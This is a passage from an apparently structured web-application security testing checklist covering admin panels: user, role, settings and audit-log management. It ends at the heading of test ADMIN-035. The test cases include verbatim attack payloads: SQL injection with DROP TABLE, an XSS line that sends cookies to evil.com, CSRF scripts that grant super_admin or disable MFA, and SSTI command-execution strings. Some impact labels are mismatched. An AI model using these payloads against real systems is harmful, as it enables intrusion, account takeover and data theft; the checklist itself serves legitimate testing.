# 22. Administrative Features — Checklist

Feature-area security **test cases** for “22. Administrative Features”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*159 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## ADMIN-001 — Unauthorized Access to User Management Panel
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Login as a regular non-admin user. 2. Navigate directly to the user management URL. 3. Access user management API endpoints. 4. Check if user listing or CRUD operations are accessible. 5. Test with different HTTP methods.

**Expected Result:** Application must restrict all user management functionality to authorized admin roles and return 403 Forbidden for unauthorized users.

**Payload Example:**

```
GET /api/admin/users;POST /api/admin/users/create;PUT /api/admin/users/1001;DELETE /api/admin/users/1001 with regular user token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-002 — IDOR on User Profile Access via Admin Panel
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Login as an admin. 2. View a specific user profile. 3. Change user_id to access users in other tenants or organizations. 4. Enumerate user IDs. 5. Check for cross-tenant data leakage.

**Expected Result:** Application must enforce tenant isolation in user management and prevent admin from accessing users outside their authorized scope.

**Payload Example:**

```
Change GET /api/admin/users/1001 to GET /api/admin/users/9999;enumerate user IDs across tenants
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-003 — Privilege Escalation via User Role Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. As a lower-privilege admin attempt to elevate a user to super-admin. 2. Modify own role to super-admin via API. 3. Create a new user with elevated privileges. 4. Check for role hierarchy enforcement.

**Expected Result:** Application must enforce role hierarchy preventing admins from creating or modifying users with equal or higher privileges than their own.

**Payload Example:**

```
PUT /api/admin/users/1001 with role=super_admin using regular admin token;POST /api/admin/users/create with role=owner
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-004 — SQL Injection in User Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Use the admin user search functionality. 2. Inject SQL payloads in search parameters including name and email and role and status. 3. Test with UNION-based and blind injection. 4. Observe responses for data leakage.

**Expected Result:** Application must use parameterized queries for all user search operations in the admin panel.

**Payload Example:**

```
GET /api/admin/users/search?q=' OR 1=1--;GET /api/admin/users?email=test' UNION SELECT password;role FROM users--;search=admin'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-005 — XSS in User Management Fields
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Create or edit a user with XSS payload in name and email and department and notes fields. 2. View the user listing in the admin panel. 3. Check if the payload executes for other admins. 4. Test in CSV/PDF export of user list.

**Expected Result:** Application must sanitize all user management input fields and encode output when rendering user data in the admin panel.

**Payload Example:**

```
username=<script>alert(document.cookie)</script>;department=<img src=x onerror=alert(1)>;notes=<svg/onload=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-006 — CSRF on User Account Modification
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Craft a malicious page that modifies a user's role or deactivates an account. 2. Lure an admin to visit while authenticated. 3. Check if CSRF protection exists on user management operations. 4. Test all user CRUD operations.

**Expected Result:** Application must validate anti-CSRF tokens on all user management operations including creation and modification and deletion.

**Payload Example:**

```
<form action='https://target.com/api/admin/users/1001' method='POST'><input name='role' value='disabled'><input name='_method' value='PUT'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADMIN-007 — Mass User Deletion Without Confirmation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Attempt bulk user deletion via API. 2. Check if confirmation is required. 3. Test if there are safeguards against deleting all users. 4. Verify if self-deletion is prevented. 5. Check for undo capability.

**Expected Result:** Application must require explicit confirmation for bulk user operations and prevent deletion of the last admin account or self-deletion.

**Payload Example:**

```
POST /api/admin/users/bulk-delete with user_ids=[1001;1002;...;9999];attempt DELETE of own admin account
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-008 — User Account Enumeration via Admin API
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Access user listing endpoint with various filters. 2. Check if the API reveals user existence through response differences. 3. Test with email enumeration. 4. Check for verbose error messages.

**Expected Result:** Application must not reveal user existence through API response differences and must implement consistent error handling.

**Payload Example:**

```
GET /api/admin/users?email=exists@test.com vs email=nonexistent@test.com;compare response codes and messages
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ADMIN-009 — Forced Password Reset by Non-Authorized Admin
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. As a lower-level admin attempt to reset passwords for higher-level admins. 2. Force password reset for users outside jurisdiction. 3. Check for role hierarchy enforcement on password operations.

**Expected Result:** Application must enforce role hierarchy on password reset operations preventing lower-level admins from resetting higher-level admin passwords.

**Payload Example:**

```
POST /api/admin/users/SUPER_ADMIN_ID/reset-password with regular admin token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-010 — User Data Export Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Attempt to export all user data. 2. Check if export includes sensitive fields like password hashes and payment info. 3. Test if non-admin users can access export endpoints. 4. Verify data minimization in exports.

**Expected Result:** Application must restrict user data export to authorized admins and exclude highly sensitive fields like password hashes from exports.

**Payload Example:**

```
GET /api/admin/users/export;GET /api/admin/users/export?format=csv with non-admin credentials;check export for password_hash fields
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-011 — Mass Assignment on User Object
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Create or update a user via admin API. 2. Add hidden parameters like is_super_admin=true or bypass_2fa=true or email_verified=true. 3. Check if unauthorized fields are accepted.

**Expected Result:** Application must whitelist allowed user attributes for admin operations and reject any unauthorized parameters.

**Payload Example:**

```
Add is_super_admin=true&bypass_2fa=true&email_verified=true&account_balance=999999 to user creation body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ADMIN-012 — User Session Invalidation After Admin Changes
**Test Category:** Session Management (WSTG-SESS-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Admin deactivates a user account. 2. Check if the user's active sessions are immediately invalidated. 3. Admin changes user role. 4. Verify if the user's permissions are updated in real-time without requiring re-login.

**Expected Result:** Application must immediately invalidate all active sessions when an admin deactivates an account or changes critical user attributes like role.

**Payload Example:**

```
Deactivate user then check if their existing session token still works for API access;change role and test old permissions
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-013 — Unauthorized Role Creation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. As a regular admin attempt to create new roles. 2. Access role management API endpoints. 3. Create a role with super-admin permissions. 4. Check if role creation is restricted to authorized users.

**Expected Result:** Application must restrict role creation and modification to authorized super-admin or role management users only.

**Payload Example:**

```
POST /api/admin/roles/create with regular admin token;create role with permissions=["*"] or permissions=["admin.all"]
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-014 — Permission Escalation via Role Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Edit an existing role. 2. Add permissions that exceed the editor's own permission level. 3. Assign self to the modified role. 4. Check if the application enforces permission boundaries.

**Expected Result:** Application must prevent admins from adding permissions to roles that exceed their own permission level and enforce permission hierarchy.

**Payload Example:**

```
PUT /api/admin/roles/ROLE-1001 adding permission=super_admin.all;add delete_users to a role when editor lacks that permission
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-015 — Role Deletion Impact Assessment Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Delete a role that is actively assigned to users. 2. Check if assigned users lose access or get default role. 3. Test if orphaned users gain unexpected permissions. 4. Verify impact assessment before deletion.

**Expected Result:** Application must prevent deletion of roles with active assignments or reassign users before deletion with proper impact assessment.

**Payload Example:**

```
DELETE /api/admin/roles/ROLE-1001 when 100+ users are assigned;check for orphaned permissions
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-016 — SQL Injection in Role Permission Query
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. View role permissions. 2. Inject SQL payloads in role_id or permission filter parameters. 3. Test for data extraction from roles and users tables. 4. Observe for SQL errors.

**Expected Result:** Application must use parameterized queries for all role and permission management database operations.

**Payload Example:**

```
GET /api/admin/roles?id=' OR 1=1--;GET /api/admin/roles/permissions?role=' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-017 — XSS in Role Name and Description
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Create or edit a role with XSS payload in name and description. 2. View the role listing and assignment pages. 3. Check if the payload executes for other admins viewing roles.

**Expected Result:** Application must sanitize all role management fields and encode output when rendering role information.

**Payload Example:**

```
role_name=<script>alert(document.cookie)</script>;role_description=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-018 — IDOR on Role Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Access own organization's roles. 2. Change role_id to access roles from another tenant. 3. Enumerate role IDs across tenants. 4. Check for cross-tenant role data leakage.

**Expected Result:** Application must enforce tenant isolation on role management and prevent cross-tenant role access or enumeration.

**Payload Example:**

```
GET /api/admin/roles/ROLE-2001 from different tenant;enumerate ROLE-0001 through ROLE-9999
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-019 — CSRF on Role Assignment
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Craft a malicious page that assigns a privileged role to an attacker-controlled user. 2. Lure admin to visit. 3. Check if role assignment occurs without CSRF token validation.

**Expected Result:** Application must validate CSRF tokens on all role assignment and modification operations.

**Payload Example:**

```
<script>fetch('/api/admin/users/ATTACKER_ID/role',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"role":"super_admin"}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADMIN-020 — Default Role Permission Audit
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Check permissions assigned to the default user role. 2. Verify if default role has excessive permissions. 3. Check if new users get admin or elevated default roles. 4. Review all predefined roles for least privilege.

**Expected Result:** Default roles must follow the principle of least privilege with no administrative permissions granted to regular user defaults.

**Payload Example:**

```
Review GET /api/admin/roles/default for excessive permissions;check new user registration default_role assignment
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Manual Review

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADMIN-021 — Role Hierarchy Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Check if the application enforces role hierarchy. 2. As a mid-level admin attempt to manage higher-level admins. 3. Try to view or modify super-admin accounts. 4. Check if role hierarchy is consistently enforced.

**Expected Result:** Application must enforce a strict role hierarchy preventing lower-level admins from managing users at or above their level.

**Payload Example:**

```
PUT /api/admin/users/SUPER_ADMIN_ID/settings with regular admin token;attempt to deactivate higher-level admin
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-022 — Unauthorized System Settings Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. As a non-admin user attempt to access system settings. 2. Try API endpoints for system configuration. 3. Check if settings are readable or modifiable. 4. Test with different role levels.

**Expected Result:** Application must restrict all system settings access to authorized super-admin roles and return 403 for unauthorized access.

**Payload Example:**

```
GET /api/admin/settings;PUT /api/admin/settings/security;POST /api/admin/settings/email with non-admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-023 — Sensitive Configuration Exposure in API Response
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Access system settings API. 2. Check if response includes database connection strings or API keys or SMTP passwords or secret keys. 3. Verify sensitive values are masked. 4. Check for encryption key exposure.

**Expected Result:** System settings API must mask or exclude sensitive configuration values like passwords and API keys and encryption keys from responses.

**Payload Example:**

```
Check GET /api/admin/settings for db_password;smtp_password;api_secret;encryption_key;jwt_secret in plain text
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-024 — System Settings Manipulation for Security Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Modify system security settings via API. 2. Disable password complexity requirements. 3. Disable 2FA enforcement. 4. Disable rate limiting or CAPTCHA. 5. Check if security features can be turned off.

**Expected Result:** Application must require elevated authentication and audit logging for security setting changes and prevent disabling critical security features without safeguards.

**Payload Example:**

```
PUT /api/admin/settings with password_min_length=1;two_factor_required=false;rate_limiting_enabled=false;captcha_enabled=false
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-025 — SQL Injection in System Settings Save
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Modify system settings and inject SQL payloads in setting values. 2. Test in setting names and descriptions. 3. Submit and observe for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all system settings storage and retrieval operations.

**Payload Example:**

```
setting_value=test' OR 1=1--;setting_name=smtp_host'; DROP TABLE settings;--;app_name=<value>' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-026 — XSS via System Settings Values
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Modify system settings with XSS payload in values like app_name or welcome_message or footer_text. 2. View application pages where settings are rendered. 3. Check if XSS executes for all users.

**Expected Result:** Application must sanitize all system setting values and encode output when rendering settings in application pages.

**Payload Example:**

```
app_name=<script>alert(document.cookie)</script>;welcome_message=<img src=x onerror=alert(1)>;footer_text=<svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-027 — CSRF on Critical System Settings Change
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Craft a malicious page that modifies critical system settings like security or authentication configuration. 2. Lure super-admin to visit. 3. Check if settings change without CSRF validation.

**Expected Result:** Application must validate CSRF tokens and require re-authentication for changes to critical system security settings.

**Payload Example:**

```
<script>fetch('/api/admin/settings',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"mfa_required":false,password_policy:"none"}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADMIN-028 — System Settings Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Send concurrent system settings update requests with conflicting values. 2. Check if final state is inconsistent. 3. Test with rapid toggling of security features. 4. Verify atomic settings updates.

**Expected Result:** Application must implement atomic system settings updates with proper locking to prevent inconsistent configuration from concurrent modifications.

**Payload Example:**

```
Send concurrent PUT /api/admin/settings with conflicting values for same setting simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADMIN-029 — SSTI in System Settings Template Values
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. If system settings include template-rendered values inject SSTI payloads. 2. Test in email templates and page templates and notification templates referenced by settings. 3. Check for template evaluation.

**Expected Result:** Application must treat system setting values as static data and not process template syntax within setting values.

**Payload Example:**

```
app_tagline={{7*7}};custom_header=${Runtime.getRuntime().exec('id')};footer=<%= system('whoami') %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ADMIN-030 — Unauthorized Audit Log Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. As a regular user attempt to access audit logs. 2. Try various audit log API endpoints. 3. Check if log viewing is restricted to security admin roles. 4. Test with different role levels.

**Expected Result:** Application must restrict audit log access to authorized security administrators and audit roles only.

**Payload Example:**

```
GET /api/admin/audit-logs;GET /api/admin/audit-logs/search;GET /api/admin/audit-logs/export with non-admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-031 — Audit Log Tampering
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Attempt to modify existing audit log entries via API. 2. Try to delete specific log entries. 3. Check if logs are append-only. 4. Test for log truncation endpoints. 5. Verify log integrity protection.

**Expected Result:** Audit logs must be immutable and append-only with integrity verification preventing any modification or deletion by any user including admins.

**Payload Example:**

```
PUT /api/admin/audit-logs/LOG-1001;DELETE /api/admin/audit-logs/LOG-1001;POST /api/admin/audit-logs/truncate with admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-032 — Audit Log Injection
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Perform actions that generate audit log entries. 2. Include CRLF and newline characters in logged parameters. 3. Inject fake log entries via crafted input. 4. Test for ANSI escape code injection. 5. Verify log sanitization.

**Expected Result:** Application must sanitize all data written to audit logs to prevent log injection and log forging attacks.

**Payload Example:**

```
username=admin%0a[SUCCESS] Super admin login from trusted IP;action=update%0d%0a[CRITICAL] Unauthorized access granted;inject ANSI codes
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-033 — SQL Injection in Audit Log Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Search audit logs by various criteria. 2. Inject SQL payloads in search parameters like date range and user and action type. 3. Observe for SQL errors or unauthorized data extraction.

**Expected Result:** Application must use parameterized queries for all audit log search and filtering operations.

**Payload Example:**

```
GET /api/admin/audit-logs?user=' OR 1=1--;GET /api/admin/audit-logs?action=login' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-034 — Audit Log Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Review audit log entries for sensitive data exposure. 2. Check if passwords or tokens or API keys appear in logs. 3. Verify if PII is properly masked in log entries. 4. Check for excessive logging detail.

**Expected Result:** Audit logs must not contain plaintext passwords or session tokens or API keys and must mask PII appropriately.

**Payload Example:**

```
Check audit log entries for password=plaintext;session_token=full_value;api_key=full_value;credit_card=full_number
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Manual Review

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-035 — Audit Log Export IDOR
